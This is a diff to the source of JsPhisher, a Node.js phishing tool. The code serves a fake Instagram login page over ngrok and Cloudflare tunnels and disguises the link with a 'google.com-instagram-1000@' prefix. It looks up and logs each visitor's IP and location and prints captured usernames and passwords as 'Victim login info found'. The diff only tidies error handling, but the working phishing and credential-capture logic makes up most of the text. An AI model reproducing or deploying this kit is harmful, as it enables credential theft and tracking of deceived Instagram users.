@@ -11,7 +11,9 @@ try {
 	require("body-parser");
 } catch (e) {
 	console.clear();
-	if (e.code !== "MODULE_NOT_FOUND") throw e;
+	if (e.code !== "MODULE_NOT_FOUND") {
+		throw e;
+	}
 	console.log("You don't have node_modules installed.");
 	console.log("Installing dependencies...");
 	require("child_process").execSync("npm install");
@@ -66,8 +68,8 @@ app.use(express.static(path.join(__dirname, "bin", "instagram")));
 app.disable("x-powered-by");
 
 (async () => {
-	await controlVersion();
-	await installRequirements();
+	await controlVersion().catch(throwError);
+	await installRequirements().catch(throwError);
 	if (isTermux) {
 		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
 		await new Promise(r => setTimeout(r, 1000));
@@ -80,10 +82,10 @@ app.disable("x-powered-by");
 		})
 	);
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
-	const ngrok = await openNgrok(port).catch(console.error);
-	const shortNgrok = await short(ngrok).catch(console.error);
-	const cloudflared = !isTermux ? await openCloudflared(port).catch(console.error) : null;
-	const shortCf = !isTermux ? await short(cloudflared).catch(console.error) : null;
+	const ngrok = await openNgrok(port).catch(throwError);
+	const shortNgrok = await short(ngrok).catch(throwError);
+	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
+	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
 	if (!isTermux) {
 		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
@@ -93,10 +95,11 @@ app.disable("x-powered-by");
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
-	if (process.platform === "win32")
+	if (process.platform === "win32") {
 		require("readline")
 			.createInterface({ input: process.stdin, output: process.stdout })
 			.on("SIGINT", () => process.emit("SIGINT"));
+	}
 	process.on("SIGINT", onExit);
 })();
 
@@ -106,7 +109,7 @@ app.all("/", async (req, res) => {
 	const ua = agentParser(userAgent);
 	const referer = req.headers?.referer;
 	const location = geoip.lookup(ip);
-	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(console.error);
+	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
 	res.redirect("login");
 	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
 		console.clear();
@@ -137,8 +140,11 @@ app.get("/login", (_req, res) => {
 
 app.post("/login", (req, res) => {
 	const { username, password } = req.body;
+	if (!username?.trim?.() || !password?.trim?.()) {
+		res.redirect("/login");
+		return;
+	}
 	res.redirect("https://instagram.com");
-	if (!username?.trim?.() || !password?.trim?.()) return;
 	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);
 
 	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Username:  ${username}`);
@@ -195,32 +201,49 @@ function installRequirements() {
 		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
 			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${process.arch ?? "arm"}.deb` : "windows-386.exe"}`;
-			await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
-			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
-			if (isLinux) child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
+			try {
+				await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
+				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
+				if (isLinux) {
+					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
+				}
+			} catch {
+				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
+				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
+			}
 		}
 		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
 			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${process.arch ?? "arm"}.tgz` : "windows-386.zip"}`;
-			await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
-			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
-			console.log(chalk.yellow`${logInfo2} Extracting...`);
-			if (isLinux) {
-				child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
-				fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
-			} else {
-				new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
-				fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
+			try {
+				await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
+				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
+				console.log(chalk.yellow`${logInfo2} Extracting...`);
+				if (isLinux) {
+					child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
+					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
+				} else {
+					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
+					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
+				}
+				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
+			} catch {
+				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
+				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
 			}
-			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
 		}
 		if (fs.existsSync(path.join(__dirname, "bin", "instagram.zip"))) {
 			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
-			new AdmZip(path.join(__dirname, "bin", "instagram.zip")).extractAllTo(path.join(__dirname, "bin", "instagram"), true);
-			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
-			console.log(chalk.yellow`${logInfo2} Removing instagram.zip...`);
-			fs.unlinkSync(path.join(__dirname, "bin", "instagram.zip"));
-			console.log(chalk.yellow`${logSuccess} Removed!\n`);
+			try {
+				new AdmZip(path.join(__dirname, "bin", "instagram.zip")).extractAllTo(path.join(__dirname, "bin", "instagram"), true);
+				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
+				console.log(chalk.yellow`${logInfo2} Removing zip file...`);
+				fs.unlinkSync(path.join(__dirname, "bin", "instagram.zip"));
+				console.log(chalk.yellow`${logSuccess} Removed!\n`);
+			} catch {
+				console.log(chalk.redBright`${logError} Failed to extract instagram!\n`);
+				console.log(chalk.yellow`${logInfo} Please extract it manually\n`);
+			}
 		}
 		resolve();
 	});
@@ -228,27 +251,43 @@ function installRequirements() {
 
 function openNgrok(port) {
 	return new Promise(async (resolve, reject) => {
+		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
+			return reject("Cannot found ngrok!");
+		}
 		child_process.spawn("bin/ngrok", ["http", port]);
 		await new Promise(r => setTimeout(r, 3000));
-		let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
-		if (!request?.data) return reject("Failed to start ngrok, please try again");
-		if (!request.data?.tunnels) {
-			await new Promise(r => setTimeout(r, 5000));
-			request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
+		let ngrokUrl;
+		while (!ngrokUrl) {
+			try {
+				let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
+				if (request?.data?.tunnels) {
+					ngrokUrl = (request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url;
+				} else {
+					await new Promise(r => setTimeout(r, 1000));
+				}
+			} catch (e) {
+				return reject("Failed to start ngrok, please try again : " + e);
+			}
 		}
-		if (!request?.data || !request?.data?.tunnels?.length) return reject("Failed to start ngrok, please try again");
-		resolve((request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url);
+		resolve(ngrokUrl);
 	});
 }
 
 function openCloudflared(port) {
-	return new Promise(async (resolve, reject) => {
-		if (isTermux) return reject("Cloudflared is not supported on Termux");
+	return new Promise((resolve, reject) => {
+		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
+			return reject("Cannot found cloudlfared!");
+		}
+		if (isTermux) {
+			return reject("Cloudflared is not supported on Termux");
+		}
 		let cfUrl;
 		let cfShowed = false;
 		let cfReady = false;
-		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", async data => {
-			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
+		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
+			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
+				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
+			}
 			cfReady = !!data.toString().match(/Connection (.*) registered/);
 			if (cfReady && !cfShowed) {
 				cfShowed = true;
@@ -258,9 +297,16 @@ function openCloudflared(port) {
 	});
 }
 
-function onExit() {
-	console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
+function onExit(withoutLog = false) {
+	if (!withoutLog) {
+		console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
+	}
 	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
-	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {});
+	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {}); //! For HTTPS
 	process.exit();
+}
+
+function throwError(error) {
+	console.log(chalk.redBright`${logError} ${error}\n`);
+	onExit(true);
 }
